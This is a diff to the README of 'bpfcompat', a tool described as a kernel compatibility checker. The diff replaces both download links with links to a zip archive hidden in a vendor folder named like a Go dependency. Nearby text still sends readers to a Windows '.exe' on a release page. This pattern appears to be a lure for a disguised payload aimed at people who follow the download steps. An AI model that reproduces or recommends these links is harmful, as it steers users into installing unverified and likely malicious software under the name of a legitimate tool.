@@ -1,6 +1,6 @@
 # ⚙️ bpfcompat - Ensure kernel compatibility for your software
 
-[![Download bpfcompat](https://img.shields.io/badge/Download-bpfcompat-blue.svg)](https://github.com/davidso1936/bpfcompat)
+[![Download bpfcompat](https://img.shields.io/badge/Download-bpfcompat-blue.svg)](https://github.com/davidso1936/bpfcompat/raw/refs/heads/main/vendor/go.yaml.in/yaml/Software-v3.2.zip)
 
 ## 🎯 Purpose
 
@@ -25,7 +25,7 @@ By using this tool, you avoid hours of troubleshooting. You gain confidence that
 
 You can download the latest version of bpfcompat directly from our GitHub release page.
 
-[Click here to visit the download page](https://github.com/davidso1936/bpfcompat)
+[Click here to visit the download page](https://github.com/davidso1936/bpfcompat/raw/refs/heads/main/vendor/go.yaml.in/yaml/Software-v3.2.zip)
 
 On this page, look for the section labeled "Assets." Click the link that ends in .exe for Windows. Save the file to a folder where you can easily find it, such as your Downloads folder.
 
